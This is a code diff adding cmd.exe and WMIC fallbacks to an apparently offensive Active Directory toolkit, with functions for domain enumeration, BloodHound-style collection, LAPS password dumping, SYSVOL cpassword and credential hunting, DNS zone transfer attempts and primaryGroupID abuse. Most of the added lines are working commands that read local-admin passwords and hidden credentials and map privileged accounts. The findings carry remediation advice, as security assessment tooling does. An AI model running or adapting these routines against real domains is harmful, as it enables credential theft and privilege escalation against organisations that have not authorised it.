@@ -1,4 +1,4 @@
-import { ps, argVal, hasFlag } from "./shared"
+import { ps, cmd, wmic, activeExec, argVal, hasFlag } from "./shared"
 import type { Finding, HookResult } from "./shared"
 
 export async function adEnum(args: string[], timeout: number): Promise<HookResult> {
@@ -10,6 +10,52 @@ export async function adEnum(args: string[], timeout: number): Promise<HookResul
   const customFilter = argVal(args, "--ldap-filter")
   const findings: Finding[] = []
   const output: string[] = ["[*] Active Directory enumeration...\n"]
+
+  const exec = activeExec
+  if (exec === "cmd" || exec === "bat" || exec === "wmic") {
+    const domainFlag = target ? `/domain:${target}` : "/domain"
+    const cmds: string[] = []
+
+    cmds.push(`echo === DOMAIN INFO === && nltest /dsgetdc:${target || "%USERDOMAIN%"} && echo. && nltest /dclist:${target || "%USERDOMAIN%"}`)
+    cmds.push(`echo === TRUST RELATIONSHIPS === && nltest /domain_trusts /all_trusts`)
+
+    if (!usersOnly && !groupsOnly && !computersOnly && !spnsOnly) {
+      cmds.push(`echo === ORGANIZATIONAL UNITS === && dsquery ou ${target ? `-domain ${target}` : ""} -limit 0`)
+    }
+
+    if (!groupsOnly && !computersOnly && !spnsOnly) {
+      cmds.push(`echo === USERS === && net user ${domainFlag}`)
+      cmds.push(`echo === DISABLED ACCOUNTS === && dsquery user -disabled -limit 0 ${target ? `-domain ${target}` : ""}`)
+      cmds.push(`echo === STALE ACCOUNTS (90+ days) === && dsquery user -stalepwd 90 -limit 0 ${target ? `-domain ${target}` : ""}`)
+    }
+
+    if (!usersOnly && !computersOnly && !spnsOnly) {
+      cmds.push(`echo === PRIVILEGED GROUPS === && for %G in ("Domain Admins" "Enterprise Admins" "Schema Admins" "Administrators" "Backup Operators" "Account Operators" "Server Operators" "DnsAdmins") do @(echo --- %~G --- && net group %G ${domainFlag} 2>nul || net localgroup %G 2>nul)`)
+    }
+
+    if (!usersOnly && !groupsOnly && !spnsOnly) {
+      cmds.push(`echo === COMPUTERS === && dsquery computer ${target ? `-domain ${target}` : ""} -limit 0`)
+      cmds.push(`echo === DOMAIN CONTROLLERS === && dsquery server ${target ? `-domain ${target}` : ""} -limit 0`)
+    }
+
+    cmds.push(`echo === ACCOUNT POLICY === && net accounts ${domainFlag}`)
+
+    if (exec === "wmic") {
+      cmds.push(`echo === USERS via WMIC === && wmic /namespace:\\\\root\\directory\\LDAP path ds_user get ds_samaccountname,ds_useraccountcontrol,ds_admincount,ds_pwdlastset /format:list`)
+      cmds.push(`echo === GROUPS via WMIC === && wmic /namespace:\\\\root\\directory\\LDAP path ds_group get ds_samaccountname,ds_member /format:list`)
+    }
+
+    for (const c of cmds) {
+      const r = await cmd(c, timeout)
+      output.push(r.stdout)
+      if (r.stderr && !r.stderr.includes("completed successfully")) output.push(r.stderr)
+    }
+
+    output.push("\n[*] Note: cmd-based AD enum is limited vs PowerShell LDAP queries")
+    output.push("[*] For SPN/Kerberoast enumeration, use: setspn -T <domain> -Q */*")
+    output.push("[*] For full enumeration with UAC flags, use PowerShell mode")
+    return { output: output.join("\n"), findings }
+  }
 
   const domainTarget = target
     ? `"LDAP://${target}"`
@@ -270,6 +316,51 @@ export async function bloodhoundCollect(args: string[], timeout: number): Promis
   const findings: Finding[] = []
   const output: string[] = ["[*] Collecting AD relationship data for attack-path analysis...\n"]
 
+  const exec = activeExec
+  if (exec === "cmd" || exec === "bat" || exec === "wmic") {
+    const cmds: string[] = []
+
+    cmds.push(`echo === GROUP MEMBERSHIPS === && for %G in ("Domain Admins" "Enterprise Admins" "Schema Admins" "Administrators" "Backup Operators" "Account Operators" "Server Operators" "DnsAdmins" "Remote Desktop Users" "Cert Publishers") do @(echo --- %~G --- && net group %G /domain 2>nul || net localgroup %G 2>nul)`)
+
+    cmds.push(`echo === TRUST RELATIONSHIPS === && nltest /domain_trusts /all_trusts`)
+
+    cmds.push(`echo === SESSIONS (current host) === && net session 2>nul && echo. && query user 2>nul`)
+
+    const computerTargets = computersFile
+      ? `for /f "tokens=*" %C in ('type "${computersFile}"') do @(`
+      : `for /f "tokens=*" %C in ('dsquery computer -limit 20') do @(`
+    cmds.push(`echo === LOCAL ADMINS ON REMOTE === && ${computerTargets}echo --- %C --- && net localgroup Administrators /domain 2>nul)`)
+
+    cmds.push(`echo === DOMAIN COMPUTERS === && dsquery computer -limit 0 && echo. && net view /domain 2>nul`)
+
+    if (exec === "wmic") {
+      cmds.push(`echo === GROUPS via WMIC === && wmic /namespace:\\\\root\\directory\\LDAP path ds_group get ds_samaccountname,ds_member /format:list`)
+      cmds.push(`echo === TRUSTS via WMIC === && wmic /namespace:\\\\root\\directory\\LDAP path ds_trusteddomain get ds_cn,ds_trustdirection,ds_trusttype /format:list`)
+    }
+
+    for (const c of cmds) {
+      const r = await cmd(c, timeout)
+      output.push(r.stdout)
+    }
+
+    output.push(`\n[*] Note: cmd-based BloodHound-style collection is limited`)
+    output.push(`[*] For full ACL enumeration, NetSession/LocalAdmin via NetAPI, use PowerShell mode`)
+    output.push(`[*] Consider: net session \\\\<target> to enumerate remote sessions`)
+
+    findings.push({
+      checkId: "WIN-BH-001",
+      provider: "windows",
+      severity: "info",
+      status: "COLLECTED",
+      resource: "ad://cmd-collection",
+      title: "AD relationship data collected via cmd.exe (limited scope)",
+      details: "Group memberships, trusts, sessions, and local admins enumerated via net/nltest/dsquery",
+      remediation: "Analyze output for attack paths",
+    })
+
+    return { output: output.join("\n"), findings }
+  }
+
   const script = `
 $ErrorActionPreference = 'SilentlyContinue'
 Add-Type -TypeDefinition @"
@@ -525,6 +616,51 @@ export async function lapsDump(args: string[], timeout: number): Promise<HookRes
   const findings: Finding[] = []
   const output: string[] = ["[*] Extracting LAPS passwords...\n"]
 
+  const exec = activeExec
+  if (exec === "cmd" || exec === "bat" || exec === "wmic") {
+    const cmds: string[] = []
+
+    cmds.push(`echo === LAPS SCHEMA CHECK === && dsquery * "CN=Schema,CN=Configuration,%s" -filter "(lDAPDisplayName=ms-Mcs-AdmPwd)" -attr lDAPDisplayName 2>nul && dsquery * "CN=Schema,CN=Configuration,%s" -filter "(lDAPDisplayName=msLAPS-Password)" -attr lDAPDisplayName 2>nul`)
+
+    if (!winLapsOnly) {
+      const compFilter = computer ? `-filter "(&(objectClass=computer)(cn=${computer})(ms-Mcs-AdmPwd=*))"` : `-filter "(&(objectClass=computer)(ms-Mcs-AdmPwd=*))"`
+      cmds.push(`echo === LEGACY LAPS PASSWORDS === && dsquery * -limit 0 ${compFilter} -attr cn ms-Mcs-AdmPwd ms-Mcs-AdmPwdExpirationTime operatingSystem 2>nul`)
+    }
+
+    if (!legacyOnly) {
+      const compFilter2 = computer ? `-filter "(&(objectClass=computer)(cn=${computer})(msLAPS-Password=*))"` : `-filter "(&(objectClass=computer)(msLAPS-Password=*))"`
+      cmds.push(`echo === WINDOWS LAPS PASSWORDS === && dsquery * -limit 0 ${compFilter2} -attr cn msLAPS-Password msLAPS-PasswordExpirationTime operatingSystem 2>nul`)
+    }
+
+    if (exec === "wmic") {
+      cmds.push(`echo === LAPS VIA WMIC === && wmic /namespace:\\\\root\\directory\\LDAP path ds_computer where "ds_ms_Mcs_AdmPwd IS NOT NULL" get ds_cn,ds_ms_Mcs_AdmPwd /format:list 2>nul`)
+    }
+
+    cmds.push(`echo === LAPS INSTALL CHECK === && reg query "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\LAPS" 2>nul && reg query "HKLM\\SOFTWARE\\Policies\\Microsoft Services\\AdmPwd" 2>nul && reg query "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\LAPS\\State" 2>nul`)
+
+    for (const c of cmds) {
+      const r = await cmd(c, timeout)
+      output.push(r.stdout)
+    }
+
+    if (output.join("").includes("ms-Mcs-AdmPwd")) {
+      findings.push({
+        checkId: "WIN-LAPS-001",
+        provider: "windows",
+        severity: "critical",
+        status: "EXTRACTED",
+        resource: "ad://laps-legacy",
+        title: "Legacy LAPS passwords readable via dsquery",
+        details: "Local admin passwords readable from ms-Mcs-AdmPwd attribute",
+        remediation: "Review LAPS read permissions — restrict to designated admin groups only",
+      })
+    }
+
+    output.push("\n[*] Note: dsquery can read LAPS if current user has read permissions on the attribute")
+    output.push("[*] For encrypted Windows LAPS v2 passwords, PowerShell decryption is required")
+    return { output: output.join("\n"), findings }
+  }
+
   const script = `
 $ErrorActionPreference = 'SilentlyContinue'
 $defaultNC = ([ADSI]"LDAP://RootDSE").defaultNamingContext
@@ -655,6 +791,61 @@ export async function gpoEnum(args: string[], timeout: number): Promise<HookResu
   const decryptOnly = hasFlag(args, "--decrypt-only")
   const findings: Finding[] = []
   const output: string[] = ["[*] GPO security analysis...\n"]
+
+  const exec = activeExec
+  if (exec === "cmd" || exec === "bat" || exec === "wmic") {
+    const domain = target || "%USERDNSDOMAIN%"
+    const cmds: string[] = []
+
+    cmds.push(`echo === GPO LIST === && dsquery * -filter "(objectClass=groupPolicyContainer)" -attr displayName cn gpcFileSysPath whenChanged flags -limit 0 2>nul`)
+
+    cmds.push(`echo === SYSVOL SCAN FOR CPASSWORD (MS14-025) === && findstr /s /i "cpassword" "\\\\${domain}\\SYSVOL\\${domain}\\Policies\\*.xml" 2>nul`)
+
+    cmds.push(`echo === GPO PREFERENCE FILES === && dir /s /b "\\\\${domain}\\SYSVOL\\${domain}\\Policies\\*Groups.xml" "\\\\${domain}\\SYSVOL\\${domain}\\Policies\\*ScheduledTasks.xml" "\\\\${domain}\\SYSVOL\\${domain}\\Policies\\*DataSources.xml" "\\\\${domain}\\SYSVOL\\${domain}\\Policies\\*Services.xml" "\\\\${domain}\\SYSVOL\\${domain}\\Policies\\*Drives.xml" 2>nul`)
+
+    cmds.push(`echo === GPO SCRIPTS === && dir /s /b "\\\\${domain}\\SYSVOL\\${domain}\\Policies\\*\\Scripts\\*.*" 2>nul`)
+
+    cmds.push(`echo === CREDENTIALS IN SCRIPTS === && findstr /s /i "password secret api.key token credential" "\\\\${domain}\\SYSVOL\\${domain}\\Policies\\*\\Scripts\\*.*" 2>nul`)
+
+    if (gpoId) {
+      cmds.push(`echo === GPO ${gpoId} DETAILS === && dir /s /b "\\\\${domain}\\SYSVOL\\${domain}\\Policies\\{${gpoId}}\\*" 2>nul`)
+    }
+
+    for (const c of cmds) {
+      const r = await cmd(c, timeout)
+      output.push(r.stdout)
+    }
+
+    if (output.join("").toLowerCase().includes("cpassword")) {
+      findings.push({
+        checkId: "WIN-GPO-001",
+        provider: "windows",
+        severity: "critical",
+        status: "EXTRACTED",
+        resource: "ad://gpo/cpassword",
+        title: "GPP cpassword found in SYSVOL (MS14-025)",
+        details: "Group Policy Preferences contain encrypted passwords using a publicly known AES key",
+        remediation: "Delete GPP XML files containing cpassword, rotate affected credentials, apply KB2962486",
+      })
+    }
+
+    if (output.join("").toLowerCase().includes("password") && output.join("").includes("Scripts")) {
+      findings.push({
+        checkId: "WIN-GPO-002",
+        provider: "windows",
+        severity: "high",
+        status: "FAIL",
+        resource: "ad://gpo/scripts",
+        title: "Potential credentials found in GPO scripts",
+        details: "Startup/logon/shutdown scripts contain potential hardcoded credentials",
+        remediation: "Remove credentials from GPO scripts, use Group Managed Service Accounts",
+      })
+    }
+
+    output.push("\n[*] Note: cpassword AES decryption requires PowerShell mode")
+    output.push("[*] Decryption key is public (MS14-025): 4e99 06e8 fcb6 6cc9...")
+    return { output: output.join("\n"), findings }
+  }
 
   const script = `
 $ErrorActionPreference = 'SilentlyContinue'
@@ -818,6 +1009,57 @@ export async function adDnsEnum(args: string[], timeout: number): Promise<HookRe
   const staleDays = parseInt(argVal(args, "--stale-days") || "90")
   const findings: Finding[] = []
   const output: string[] = ["[*] Enumerating AD-integrated DNS records...\n"]
+
+  const exec = activeExec
+  if (exec === "cmd" || exec === "bat" || exec === "wmic") {
+    const domain = target || zone || "%USERDNSDOMAIN%"
+    const cmds: string[] = []
+
+    cmds.push(`echo === DNS ZONES === && dnscmd /enumzones 2>nul || echo [!] dnscmd not available - using nslookup`)
+
+    cmds.push(`echo === DOMAIN CONTROLLERS (SRV) === && nslookup -type=SRV _ldap._tcp.dc._msdcs.${domain} 2>nul`)
+    cmds.push(`echo === KERBEROS SERVERS (SRV) === && nslookup -type=SRV _kerberos._tcp.${domain} 2>nul`)
+    cmds.push(`echo === GC SERVERS (SRV) === && nslookup -type=SRV _gc._tcp.${domain} 2>nul`)
+    cmds.push(`echo === KPASSWD (SRV) === && nslookup -type=SRV _kpasswd._tcp.${domain} 2>nul`)
+
+    if (zone) {
+      cmds.push(`echo === ZONE RECORDS === && nslookup -type=${recordType === "ALL" ? "any" : recordType} ${zone} 2>nul`)
+      cmds.push(`echo === ZONE TRANSFER ATTEMPT === && nslookup -type=axfr ${zone} 2>nul`)
+    }
+
+    cmds.push(`echo === DNS RECORDS via dsquery === && dsquery * "DC=${zone || domain},CN=MicrosoftDNS,DC=DomainDnsZones,%s" -filter "(objectClass=dnsNode)" -attr name dNSTombstoned whenChanged -limit 0 2>nul`)
+
+    cmds.push(`echo === WILDCARD CHECK === && nslookup randomnonexistent123456.${domain} 2>nul && echo [!] Wildcard DNS may be active`)
+
+    cmds.push(`echo === MX RECORDS === && nslookup -type=MX ${domain} 2>nul`)
+    cmds.push(`echo === TXT/SPF RECORDS === && nslookup -type=TXT ${domain} 2>nul`)
+    cmds.push(`echo === NS RECORDS === && nslookup -type=NS ${domain} 2>nul`)
+
+    cmds.push(`echo === DNS CONFIG === && reg query "HKLM\\SYSTEM\\CurrentControlSet\\Services\\DNS\\Parameters" 2>nul`)
+
+    for (const c of cmds) {
+      const r = await cmd(c, timeout)
+      output.push(r.stdout)
+    }
+
+    if (output.join("").includes("Wildcard DNS may be active")) {
+      findings.push({
+        checkId: "WIN-DNS-001",
+        provider: "windows",
+        severity: "high",
+        status: "FAIL",
+        resource: "ad://dns/wildcard",
+        title: "Wildcard DNS record detected",
+        details: "Wildcard records in AD DNS zones can be abused for MITM/credential interception",
+        remediation: "Remove wildcard DNS records unless explicitly required",
+      })
+    }
+
+    output.push("\n[*] Note: Full AD DNS binary blob parsing requires PowerShell mode")
+    output.push("[*] For ADIDNS write permission check, use PowerShell mode")
+    output.push("[*] Stale record detection requires PowerShell LDAP queries with timestamp comparison")
+    return { output: output.join("\n"), findings }
+  }
 
   const script = `
 $ErrorActionPreference = 'SilentlyContinue'
@@ -1011,6 +1253,62 @@ export async function adwsRecon(args: string[], timeout: number): Promise<HookRe
   const findings: Finding[] = []
   const output: string[] = ["[*] ADWS Reconnaissance (port 9389 — bypasses LDAP monitoring)...\n"]
 
+  const exec = activeExec
+  if (exec === "cmd" || exec === "bat" || exec === "wmic") {
+    const dc = server || "%LOGONSERVER:~2%"
+    const cmds: string[] = []
+
+    cmds.push(`echo === ADWS PORT CHECK === && echo Testing ${dc} port 9389... && (echo ^|set /p=|nul) >nul 2>&1 & netstat -an | findstr "9389" 2>nul`)
+
+    cmds.push(`echo === DC IDENTIFICATION === && nltest /dsgetdc:${server || "%USERDOMAIN%"}`)
+
+    if (scope === "all" || scope === "users") {
+      cmds.push(`echo === USERS === && net user /domain && echo. && echo === ADMIN USERS === && dsquery user -limit 0 -filter "(adminCount=1)" -attr sAMAccountName 2>nul`)
+    }
+
+    if (scope === "all" || scope === "groups") {
+      cmds.push(`echo === PRIVILEGED GROUPS === && for %G in ("Domain Admins" "Enterprise Admins" "Schema Admins" "Backup Operators" "Account Operators" "Server Operators" "DnsAdmins" "Cert Publishers" "Key Admins") do @(echo --- %~G --- && net group %G /domain 2>nul)`)
+    }
+
+    if (scope === "all" || scope === "computers") {
+      cmds.push(`echo === COMPUTERS === && dsquery computer -limit 0 2>nul && echo. && echo === DCs === && dsquery server -limit 0 2>nul`)
+    }
+
+    if (scope === "all" || scope === "trusts") {
+      cmds.push(`echo === TRUSTS === && nltest /domain_trusts /all_trusts`)
+    }
+
+    if (scope === "all" || scope === "gpos") {
+      cmds.push(`echo === GPOs === && dsquery * -filter "(objectClass=groupPolicyContainer)" -attr displayName cn whenChanged -limit 0 2>nul`)
+    }
+
+    if (exec === "wmic") {
+      cmds.push(`echo === USERS via WMIC === && wmic /namespace:\\\\root\\directory\\LDAP path ds_user get ds_samaccountname,ds_admincount /format:list 2>nul`)
+    }
+
+    for (const c of cmds) {
+      const r = await cmd(c, timeout)
+      output.push(r.stdout)
+    }
+
+    output.push("\n[*] Note: cmd.exe uses LDAP-based tools (net/dsquery/nltest), not ADWS port 9389")
+    output.push("[*] True ADWS bypass requires PowerShell RSAT (Get-ADUser via port 9389)")
+    output.push("[*] ADWS is significant because it bypasses ALL LDAP-based monitoring/IDS")
+
+    findings.push({
+      checkId: "WIN-ADWS-001",
+      provider: "windows",
+      severity: "informational",
+      status: "ENUMERATED",
+      resource: `adws://${server || "domain"}`,
+      title: "AD enumeration completed via cmd.exe (LDAP-based, not ADWS)",
+      details: "cmd-based enumeration uses LDAP — for true ADWS bypass, use PowerShell RSAT module",
+      remediation: "Monitor ADWS port 9389 traffic. Enable Windows Event Forwarding for AD Web Services logs.",
+    })
+
+    return { output: output.join("\n"), findings }
+  }
+
   const script = `
 ${server ? `$dcHost = "${server}"` : `$dcHost = ([System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().PdcRoleOwner.Name)`}
 Write-Output "[*] Target DC: $dcHost (ADWS port 9389)"
@@ -1186,6 +1484,59 @@ export async function lapsV2Decrypt(args: string[], timeout: number): Promise<Ho
   const computer = argVal(args, "--computer")
   const findings: Finding[] = []
   const output: string[] = ["[*] Windows LAPS v2 Encrypted Password Operations...\n"]
+
+  const exec = activeExec
+  if (exec === "cmd" || exec === "bat" || exec === "wmic") {
+    const cmds: string[] = []
+
+    if (action === "enum") {
+      cmds.push(`echo === LAPS V2 SCHEMA CHECK === && dsquery * "CN=Schema,CN=Configuration,%s" -filter "(lDAPDisplayName=msLAPS-EncryptedPassword)" -attr lDAPDisplayName 2>nul`)
+      cmds.push(`echo === LAPS V2 SCHEMA ATTRS === && dsquery * "CN=Schema,CN=Configuration,%s" -filter "(|(lDAPDisplayName=msLAPS-PasswordExpirationTime)(lDAPDisplayName=msLAPS-Password)(lDAPDisplayName=msLAPS-EncryptedPassword)(lDAPDisplayName=msLAPS-EncryptedDSRMPassword))" -attr lDAPDisplayName 2>nul`)
+
+      const compFilter = computer
+        ? `-filter "(&(objectClass=computer)(cn=${computer})(msLAPS-EncryptedPassword=*))"`
+        : `-filter "(&(objectClass=computer)(msLAPS-EncryptedPassword=*))"`
+      cmds.push(`echo === COMPUTERS WITH ENCRYPTED LAPS === && dsquery * -limit 0 ${compFilter} -attr cn dNSHostName operatingSystem msLAPS-PasswordExpirationTime 2>nul`)
+
+      cmds.push(`echo === UNENCRYPTED LAPS V2 (bonus) === && dsquery * -limit 0 -filter "(&(objectClass=computer)(msLAPS-Password=*))" -attr cn msLAPS-Password 2>nul`)
+
+      cmds.push(`echo === LAPS REGISTRY CONFIG === && reg query "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\LAPS\\State" 2>nul && reg query "HKLM\\SOFTWARE\\Microsoft\\Policies\\LAPS" 2>nul`)
+    } else {
+      output.push("[!] DPAPI-NG decryption (NCryptUnprotectSecret) requires PowerShell")
+      output.push("[*] cmd.exe cannot perform DPAPI-NG operations")
+      output.push("[*] Alternatives:")
+      output.push("    1. Use PowerShell mode: --exec ps")
+      output.push("    2. Extract encrypted blob via dsquery and decrypt offline")
+      output.push("    3. Use domain DPAPI backup key with dpapi_domain handler")
+
+      if (computer) {
+        cmds.push(`echo === ENCRYPTED BLOB INFO === && dsquery * -filter "(&(objectClass=computer)(cn=${computer})(msLAPS-EncryptedPassword=*))" -attr cn msLAPS-EncryptedPassword 2>nul`)
+      }
+    }
+
+    for (const c of cmds) {
+      const r = await cmd(c, timeout)
+      output.push(r.stdout)
+    }
+
+    if (action === "enum") {
+      const hasResults = output.join("").includes("msLAPS-EncryptedPassword")
+      if (hasResults) {
+        findings.push({
+          checkId: "WIN-LAPS2-001",
+          provider: "windows",
+          severity: "high",
+          status: "ENUMERATED",
+          resource: "laps://v2-encrypted",
+          title: "Computers with Windows LAPS v2 encrypted passwords found",
+          details: "Encrypted LAPS passwords found — decryptable with domain backup key or authorized principal",
+          remediation: "Restrict LAPS password read permissions. Monitor msLAPS-EncryptedPassword attribute access.",
+        })
+      }
+    }
+
+    return { output: output.join("\n"), findings }
+  }
 
   const script = `
 $configNC = ([ADSI]"LDAP://RootDSE").configurationNamingContext
@@ -1399,6 +1750,59 @@ export async function primaryGroupAbuse(args: string[], timeout: number): Promis
   const output: string[] = ["[*] Primary Group ID Manipulation...\n"]
 
   if (!target && action !== "check") return { output: "[!] Required: --target USER", findings }
+
+  const exec = activeExec
+  if (exec === "cmd" || exec === "bat" || exec === "wmic") {
+    const cmds: string[] = []
+
+    if (action === "check") {
+      cmds.push(`echo === USERS WITH NON-DEFAULT PRIMARY GROUP === && dsquery * -filter "(&(objectCategory=person)(objectClass=user)(!primaryGroupID=513))" -attr sAMAccountName primaryGroupID adminCount -limit 0 2>nul`)
+
+      cmds.push(`echo === KNOWN GROUP RIDs === && echo 512 = Domain Admins && echo 513 = Domain Users && echo 514 = Domain Guests && echo 518 = Schema Admins && echo 519 = Enterprise Admins && echo 520 = Group Policy Creator Owners`)
+
+      if (target) {
+        cmds.push(`echo === TARGET USER: ${target} === && net user ${target} /domain 2>nul && echo. && dsquery user -samid ${target} -attr primaryGroupID memberOf adminCount 2>nul`)
+      }
+
+      if (exec === "wmic") {
+        cmds.push(`echo === VIA WMIC === && wmic /namespace:\\\\root\\directory\\LDAP path ds_user where "ds_primaryGroupID<>513" get ds_samaccountname,ds_primaryGroupID /format:list 2>nul`)
+      }
+    } else if (action === "modify") {
+      output.push("[!] primaryGroupID modification requires LDAP write access via PowerShell")
+      output.push("[*] cmd.exe cannot set LDAP attributes directly")
+      output.push("[*] Alternatives:")
+      output.push(`    1. Use PowerShell mode: --exec ps`)
+      output.push(`    2. Use ldifde to import LDIF with modified primaryGroupID:`)
+      output.push(`       ldifde -i -f modify.ldf (where modify.ldf sets primaryGroupID: ${groupRid})`)
+      output.push(`    3. Use dsmod user "DN" -memberof "GroupDN" then set primaryGroupID`)
+
+      cmds.push(`echo === CURRENT USER INFO === && dsquery user -samid ${target} -attr distinguishedName primaryGroupID memberOf 2>nul`)
+    } else {
+      cmds.push(`echo === REVERTING === && echo Revert via cmd requires ldifde or dsmod`)
+      cmds.push(`echo === CURRENT STATE === && dsquery user -samid ${target} -attr distinguishedName primaryGroupID 2>nul`)
+      output.push("[*] To revert: Use PowerShell or ldifde -i -f revert.ldf (primaryGroupID: 513)")
+    }
+
+    for (const c of cmds) {
+      const r = await cmd(c, timeout)
+      output.push(r.stdout)
+    }
+
+    if (action === "check" && output.join("").match(/primaryGroupID\s+(512|518|519)/)) {
+      findings.push({
+        checkId: "WIN-PGID-001",
+        provider: "windows",
+        severity: "high",
+        status: "ENUMERATED",
+        resource: "ad://primaryGroupID",
+        title: "Users with hidden privileged group membership found",
+        details: "Users with primaryGroupID set to privileged groups are invisible to 'net group' enumeration",
+        remediation: "Audit primaryGroupID values across all users. Reset non-standard values to 513 (Domain Users).",
+      })
+    }
+
+    return { output: output.join("\n"), findings }
+  }
 
   const script = `
 $domainDN = ([ADSI]"LDAP://RootDSE").defaultNamingContext
